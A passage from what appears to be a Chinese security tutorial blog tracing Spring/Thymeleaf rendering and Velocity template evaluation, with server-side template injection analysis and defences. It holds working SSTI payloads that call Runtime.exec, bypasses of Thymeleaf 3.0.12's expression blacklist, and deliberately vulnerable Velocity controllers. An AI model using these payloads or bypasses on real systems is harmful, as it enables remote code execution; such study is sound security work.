<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847849760-e14df5b1-824f-43fa-ab52-3cb511078fb9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753847849760-e14df5b1-824f-43fa-ab52-3cb511078fb9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>后续会给<code>invocableMethod</code>的各大属性赋值，赋值后new了一个<code>ModelAndViewContainer对象</code>，后面的所有值都会保存到这一个对象中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753848038826-51991693-9f0e-48ab-935b-424b73f07d7e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753848038826-51991693-9f0e-48ab-935b-424b73f07d7e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>继续往下走，调用了<code>invocableMethod.invokeAndHandle</code>，这个方法的作用是获取<code>returnValueHandlers</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851008470-5e8cbda9-c178-4456-8bb0-73f92ada2818.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851008470-5e8cbda9-c178-4456-8bb0-73f92ada2818.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>进入<code>this.invokeForRequest</code>首先获取参数，然后调用<code>this.doInvoke</code>，层层跟进<code>invoke</code>，最后调用<code>invokeImpl</code>，根据参数的个数来invoke调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851029265-41491ef4-d7a9-4fce-a228-5ca3b49f4c31.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851029265-41491ef4-d7a9-4fce-a228-5ca3b49f4c31.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851075784-57052191-bc15-4682-b3af-c1d73b9e00e3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851075784-57052191-bc15-4682-b3af-c1d73b9e00e3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851178401-599f5383-933e-45ca-9bea-131239b5490c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851178401-599f5383-933e-45ca-9bea-131239b5490c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这样就走到了我们的<code>HelloController</code>处</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851220323-4499af3f-1570-4f97-a3b3-111c263d073d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851220323-4499af3f-1570-4f97-a3b3-111c263d073d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>return返回后，回到<code>RequestMappingHandlerAdapter#invokeHandlerMethod</code>，后面调用<code>this.getModelAndView</code>获取ModelAndView对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851421084-ead792cb-925c-4a45-b223-ae621f1c0486.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851421084-ead792cb-925c-4a45-b223-ae621f1c0486.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h6 id="BHTP0">ViewResolver与渲染</h6>

<p>获取到ModelAndView后，应该就要进行模板的渲染操作了，回到<code>DispatcherServlet#doDispatch</code></p>
<p>下面调用<code>mappedHandler.applyPostHandle</code>，该方法会遍历Interceptor，调用其<code>postHandler</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851547510-7cce7304-4285-485a-aabd-a42949601b18.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851547510-7cce7304-4285-485a-aabd-a42949601b18.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851607808-0b6d7197-f0db-4fb9-9a60-347db2a78bf1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851607808-0b6d7197-f0db-4fb9-9a60-347db2a78bf1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>遍历结束后，会调用<code>this.processDispatchResult</code>方法，在这里对Dispath的结果进行加工处理，在判断完<code>ModelAndView</code>不为空后，就会调用<code>this.render</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851811085-117eee2a-e9ac-4eb3-b8d0-ce2cfe1566db.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851811085-117eee2a-e9ac-4eb3-b8d0-ce2cfe1566db.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>this.reader</code>方法，前面会进行一些国际化的判断，获取viewName，这里的viewName就是我们Controller中return的东西，如果我们的模板是<code>FreeMarker</code>，那么view就是<code>FreeMarkerView</code>，如果是<code>Thymeleaf</code>，那么view就是<code>ThymeleafView</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851953888-28cee596-d9c5-41ad-920a-f98363b20ad4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753851953888-28cee596-d9c5-41ad-920a-f98363b20ad4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>继续跟进<code>view.render</code>中，也就是<code>ThymeleafView.render</code>方法，继续跟进<code>this.renderFragment</code>。在第一个标记部分，会判断我们的<code>viewTemplateName</code>中是有存在<code>::</code>，如果不存在则不做解析处理</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852208089-f3446729-3f8a-4ffe-9026-eb7097c836a6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852208089-f3446729-3f8a-4ffe-9026-eb7097c836a6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>继续向下跟进<code>parser.parseExpression</code>处，这里就对我们输入的字符串进行了处理（传入的字符串会进行拼接<code>~&#123;......&#125;</code>，也就是传入片段表达式中），再<code>standardExpressionPreprocessor.preprocess</code></p>
<p>首先判断input中是否存在<code>_</code>字符，没有则不做解析，接着调用<code>matcher</code>进行匹配<code>__</code>，并提取<code>__</code>中间的内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852500348-de2abdf7-a2ec-4619-80a2-3d50654df9fb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852500348-de2abdf7-a2ec-4619-80a2-3d50654df9fb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">继续向下走，就到了<code>expression.execute</code>方法处，这里解析并执行我们的SPEL表达式</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852750354-39cfd7e6-8e28-4183-846c-2f61e4b8eecb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852750354-39cfd7e6-8e28-4183-846c-2f61e4b8eecb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="UvesV">Thymeleaf SSTI Bypass</h4>
<h5 id="XAj9D">传参检测与绕过</h5>

<p>我们正常攻击时，使用的Poc是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;touch executed&quot;).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>

<p>在Thymeleaf 3.0.12中，对这个漏洞做了修复</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852871326-fafac758-807d-43f0-8dfc-b258fc100ed6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753852871326-fafac758-807d-43f0-8dfc-b258fc100ed6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在调用表达式时，会经过以下函数的判断</p>
<p>倒序检测是否包含<font style="color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);">wen</font>、在<code>(</code>的左右是否包含<code>T</code>字符，如果包含的话，那么就认为找到了一个实例化的对象，返回true，从而阻止该表达式的执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">containsSpELInstantiationOrStatic</span><span class="params">(<span class="keyword">final</span> String expression)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">explen</span> <span class="operator">=</span> expression.length();</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> explen;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ni</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// index for computing position in the NEW_ARRAY</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">si</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="keyword">while</span> (n-- != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        c = expression.charAt(n);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ni &lt; NEW_LEN</span><br><span class="line">            &amp;&amp; c == NEW_ARRAY[ni]</span><br><span class="line">            &amp;&amp; (ni &gt; <span class="number">0</span> || ((n + <span class="number">1</span> &lt; explen) &amp;&amp; Character.isWhitespace(expression.charAt(n + <span class="number">1</span>))))) &#123;</span><br><span class="line">            ni++;</span><br><span class="line">            <span class="keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="number">1</span>)))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// we found an object instantiation</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ni &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            n += ni;</span><br><span class="line">            ni = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (si &lt; n) &#123;</span><br><span class="line">                <span class="comment">// This has to be restarted too</span></span><br><span class="line">                si = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ni = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">            si = n;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (si &gt; n &amp;&amp; c == <span class="string">&#x27;(&#x27;</span></span><br><span class="line">                   &amp;&amp; ((n - <span class="number">1</span> &gt;= <span class="number">0</span>) &amp;&amp; (expression.charAt(n - <span class="number">1</span>) == <span class="string">&#x27;T&#x27;</span>))</span><br><span class="line">                   &amp;&amp; ((n - <span class="number">1</span> == <span class="number">0</span>) || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="number">2</span>)))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (si &gt; n &amp;&amp; !(Character.isJavaIdentifierPart(c) || c == <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            si = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果要绕过这个函数的话，就需要满足：</p>
<ol>
<li>表达式中不能包含new关键字</li>
<li>在<code>(</code>左边的字符不是<code>T</code></li>
</ol>
<p>那么可以通过在<code>T</code>和<code>(</code>中间添加一个字符，来绕过检测，但是不能使原有的表达式出现问题，可以利用的包括<code>%20</code>，<code>%0a</code>，<code>%09</code>，<code>%0d</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">__$&#123;T%<span class="number">20</span>(%0ajava.lang.Runtime%09).%0dgetRuntime%0a(%09)%<span class="number">0d</span>.%00exec(<span class="string">&#x27;calc&#x27;</span>)&#125;__::.x</span><br></pre></td></tr></table></figure>

<h5 id="mfCEA">url中的ThymeleafSSTI</h5>
根据spring boot定义，如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getDocument</span><span class="params">(<span class="meta">@PathVariable</span> String document)</span> &#123;  </span><br><span class="line">    log.info(<span class="string">&quot;Retrieving &quot;</span> + document);  </span><br><span class="line">    <span class="comment">//returns void, so view name is taken from URI  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样在3.0.12版本也被修复了，官方说明如下</p>
<blockquote>
<p>如果视图名称包含在 URL 的路径或参数中，请避免将视图名称作为片段表达式执行</p>
</blockquote>
<p>意思是：如果视图的名字和path一致的话，那么就会经过<code>SpringRequestUtils.java</code>中<code>checkViewNameNotInRequest</code>方法的检测</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753854314865-d845faae-4073-4475-b3b7-5c93c3131cae.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753854314865-d845faae-4073-4475-b3b7-5c93c3131cae.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>想要绕过的话，我们可以想办法让 视图的名字和path 不一致，就可以绕过检测</p>
<p>这里直接将两个Poc拿出来，不进行分析了：</p>
<h6 id="Bgk9I">Poc1</h6>

<p>在home的后面加上一个<code>;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">home;/__$&#123;t(java.lang.runtime).getruntime().exec(<span class="string">&quot;open-acalculator&quot;</span>)&#125;__::.x</span><br></pre></td></tr></table></figure>

<h6 id="ugyPD">Poc2</h6>

<p>添加一个<code>/</code>字符</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">home<span class="comment">//__$&#123;t(java.lang.runtime).getRuntime().exec(&quot;open-acalculator&quot;)&#125;__::.x</span></span><br></pre></td></tr></table></figure>

<h4 id="vOrLm">ThymeleafSSTI无回显</h4>

<p>出现的场景为在片段选择器<code>templatename::selector</code>下。fragment中payload前有<code>::</code>，所以payload在selector位置会抛出异常，虽然无法回显成功，但是命令依旧可以执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; <span class="comment">//template path is tainted  </span></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@GetMapping(&quot;/fragment&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">fragment</span><span class="params">(<span class="meta">@RequestParam</span> String section)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;welcome :: &quot;</span> + section; <span class="comment">//fragment is tainted  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="qtB3K">Thymeleaf中SSTI的防御</h4>

<p>防御方法如下：</p>
<ul>
<li>配置<code>@ResponseBody</code>或<code>@RestController</code>，配置以上注解后就不会进行View解析而是直接返回</li>
<li>在方法参数中加上<code>HttpServletResponse</code>参数，spring会认为以及处理了response响应而不再进行试图解析</li>
<li>在返回值前面加上<code>redirect:</code>，交给<code>RedirectView</code>处理</li>
</ul>
<h3 id="g0UuM">Velocity</h3>

<p>Velocity 是一个基于 Java 的模板引擎。它允许任何人使用简单但功能强大的模板语言来引用 Java 代码中 定义的对象。</p>
<h4 id="H5gZl">Velocity基础</h4>
<h5 id="ULBSL">Velocity语法基础</h5>

<ul>
<li><code>#</code>关键字：Velocity关键字都是用<code>#</code>开头的，如<code>#set</code>、<code>#if</code>、<code>#else</code>、<code>#end</code>、<code>#foreach</code>等</li>
<li><code>$</code>变量：在Velocity中，变量都是以<code>$</code>开头的，如<code>$name</code>、<code>$msg</code>等</li>
<li><code>set</code>指令：<code>#set</code>指令用于设置引用的值，一个值可以被赋给一个变量引用或属性引用，如<code>#set&#123; $name = &quot;sean&quot; &#125;</code>、<code>#set&#123; $person.name = $username &#125;</code></li>
<li>方法：方法在Java中被定义，由<code>$</code>、标识符、方法体组成，如<code>$customer.getAddress()</code>、<code>$page.setTitle( &quot;My home&quot; )</code></li>
</ul>
<h4 id="VEHxw">Velocity SSTI</h4>
<h5 id="Djxun">环境搭建</h5>

<p>创建一个SpringBoot项目，选择导入SpringWeb依赖</p>
<p>然后向项目中导入<code>Velocity</code>依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Velocity模板中，有两种触发方式，这里我们创建两个Controller</p>
<h6 id="wBNzX"><font style="color:rgb(51,51,51);">evaluate触发</font></h6>
evaluate方法使用VelocityEngine的evaluate方法来执行Velocity模板的渲染，evaluate方法的基本语法如下

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">evaluate</span><span class="params">(Writer writer, Context context, String logTag, String instring)</span></span><br><span class="line"><span class="comment">//writer：输出结果的写入器，用于将生成的结果写入指定位置</span></span><br><span class="line"><span class="comment">//context：上下文数据，用于替换模板中的占位符数据</span></span><br><span class="line"><span class="comment">//logTag：日志标签，用于在日志中区分不同的evaluate调用</span></span><br><span class="line"><span class="comment">//instring：待处理的Velocity模板字符串</span></span><br></pre></td></tr></table></figure>

<p>漏洞Demo如下，获取用户输入，并放入VelocityContext中进行渲染，如果没有接收的是恶意payload，就会造成任意代码执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.velocity.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.Velocity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VelocityEvaluate</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/velocityevaluate&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">velocity</span><span class="params">(String template)</span> &#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">        context.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;powerful&quot;</span>);</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">swOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">&quot;test&quot;</span>, template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="O8puM">merge触发</h6>

<p>merge 方法用于将 Velocity 模板字符串与上下文数据进行组合并生成最终结果，merge方法的基本语法如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(Template template, Context context, Writer writer)</span></span><br><span class="line"><span class="comment">//template：待处理的Velocity模板</span></span><br><span class="line"><span class="comment">//contexxt：上下文数据，用于替换模板中占位符的数据</span></span><br><span class="line"><span class="comment">//writer：输出结果的写入器，用于将生成的结果写入到指定位置</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.velocity.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.RuntimeServices;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.RuntimeSingleton;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.parser.node.SimpleNode;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VelocityMerge</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/velocitymerge&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">velocity2</span><span class="params">(<span class="meta">@RequestParam(defaultValue = &quot;username&quot;)</span>String username)</span> <span class="keyword">throws</span> IOException, ParseException,org.apache.velocity.runtime.parser.ParseException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">templateString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\template.vm&quot;</span>)));</span><br><span class="line">        templateString = templateString.replace(<span class="string">&quot;&lt;USERNAME&gt;&quot;</span>, username);</span><br><span class="line">        <span class="type">StringReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringReader</span>(templateString);</span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">        ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Curlysean&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;13888888888&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;sean@test.com&quot;</span>);</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        org.apache.velocity.<span class="type">Template</span> <span class="variable">template</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.apache.velocity.Template();</span><br><span class="line">        <span class="type">RuntimeServices</span> <span class="variable">runtimeServices</span> <span class="operator">=</span> RuntimeSingleton.getRuntimeServices();</span><br><span class="line">        <span class="type">SimpleNode</span> <span class="variable">node</span> <span class="operator">=</span> runtimeServices.parse(reader, String.valueOf(template));</span><br><span class="line">        template.setRuntimeServices(runtimeServices);</span><br><span class="line">        template.setData(node);</span><br><span class="line">        template.initDocument();</span><br><span class="line">        template.merge(ctx, out);</span><br><span class="line">        <span class="keyword">return</span> out.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>C:\tmp\template.vm</code>中，写入我们的攻击payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>

<h5 id="kg75i">漏洞复现</h5>

<p>漏洞复现以evaluate方法漏洞Demo为例，当我们访问以下URL时，就会触发我们的SSTI（这里的环境不是很好，所以会爆500错误，正常会回显模板渲染的结果，别太在意哈）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/velocityevaluate?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753886497826-6ff873d6-0d83-4ed3-89c3-8099490fd6d8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753886497826-6ff873d6-0d83-4ed3-89c3-8099490fd6d8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="XqqoP">漏洞分析</h5>

<p>在evaluate方法处，下一个断点，跟进去看一看具体的调用流程</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753890910559-cb7952f0-ca12-4be5-bde0-05aa8e16b49a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753890910559-cb7952f0-ca12-4be5-bde0-05aa8e16b49a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>层层跟入<code>evaluate</code>方法，走到<code>RuntimeInstance#evaluate</code>中，到这里我们传入的String类型的字符串，转换成了Reader类，在<code>this.parse</code>处解析成<code>nodeTree</code>（可以自己调试着看一看，跟数据结构有点关系）。</p>
<p>最后调用<code>this.render</code>方法，传入<code>nodeTree</code>，进行渲染操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753891153242-5f88a933-1cf4-4585-ac0e-f11c1bd1ab44.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753891153242-5f88a933-1cf4-4585-ac0e-f11c1bd1ab44.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>this.render</code>方法，首先调用<code>nodeTree.init</code>对节点树进行初始化，然后调用<code>nodeTree.render</code>将节点树渲染到解析器中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753891520659-216b3402-e64d-4a15-bf2e-85c62310098e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753891520659-216b3402-e64d-4a15-bf2e-85c62310098e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进到<code>nodeTree.render</code>方法中，使用for循环遍历所有的字节点，通过<code>jjtGetChild(i)</code>方法来获取第i个子节点，并调用render方法来渲染子节点。子节点同时也有可能是子节点树，for循环遍历的时候同时也在递归渲染。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753892273877-3fb6a08e-e1f6-4573-9a9f-a3313b511c9b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753892273877-3fb6a08e-e1f6-4573-9a9f-a3313b511c9b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
